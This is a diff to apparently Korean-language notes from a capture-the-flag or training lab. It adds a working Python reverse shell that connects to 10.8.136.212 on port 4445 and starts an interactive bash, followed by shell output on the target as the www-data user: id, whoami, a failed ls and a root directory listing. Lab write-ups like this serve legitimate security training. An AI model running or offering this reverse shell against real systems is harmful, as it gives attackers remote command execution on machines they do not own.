@@ -117,4 +117,57 @@ www-data@ip-10-10-234-59:~$
 
 # 공격대상 컴퓨터 (파이썬 인터프리터) https://www.revshells.com/ 검색해서 실행
 
+```bash
+import socket
+import subprocess
+import os
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("10.8.136.212", 4445))
+
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+
+subprocess.call(["/bin/bash", "-i"])
+```
+
 # www-data 권한으로 시작
+
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+whoami
+www-data
+
+# ls 는 안 되는데 path 지정하면 잘 됨
+
+ls -al
+ls: cannot open directory '.': Permission denied
+$ ls -al /
+ls -al /
+total 2035784
+drwxr-xr-x 18 root root 4096 Jul 21 14:39 .
+drwxr-xr-x 18 root root 4096 Jul 21 14:39 ..
+lrwxrwxrwx 1 root root 7 Feb 23 2022 bin -> usr/bin
+drwxr-xr-x 4 root root 4096 Apr 27 06:25 boot
+drwxr-xr-x 17 root root 4000 Jul 21 14:39 dev
+drwxr-xr-x 106 root root 4096 Jul 21 14:39 etc
+drwxr-xr-x 4 root root 4096 Jul 21 14:39 home
+lrwxrwxrwx 1 root root 7 Feb 23 2022 lib -> usr/lib
+lrwxrwxrwx 1 root root 9 Feb 23 2022 lib32 -> usr/lib32
+lrwxrwxrwx 1 root root 9 Feb 23 2022 lib64 -> usr/lib64
+lrwxrwxrwx 1 root root 10 Feb 23 2022 libx32 -> usr/libx32
+drwx------ 2 root root 16384 Jun 2 2023 lost+found
+drwxr-xr-x 2 root root 4096 Jun 2 2023 media
+drwxr-xr-x 2 root root 4096 Feb 23 2022 mnt
+drwxr-xr-x 3 root root 4096 Jun 21 2023 opt
+dr-xr-xr-x 174 root root 0 Jul 21 14:39 proc
+drwxrwx--- 7 root root 4096 Apr 15 2024 root
+drwxr-xr-x 26 root root 780 Jul 21 14:39 run
+lrwxrwxrwx 1 root root 8 Feb 23 2022 sbin -> usr/sbin
+drwxr-xr-x 2 root root 4096 Feb 23 2022 srv
+-rw------- 1 root root 2084569088 Jun 2 2023 swap.img
+dr-xr-xr-x 13 root root 0 Jul 21 14:39 sys
+drwxrwxrwt 12 root root 4096 Jul 21 14:40 tmp
+drwxr-xr-x 14 root root 4096 Feb 23 2022 usr
+drwxr-xr-x 12 root root 4096 Dec 22 2023 var
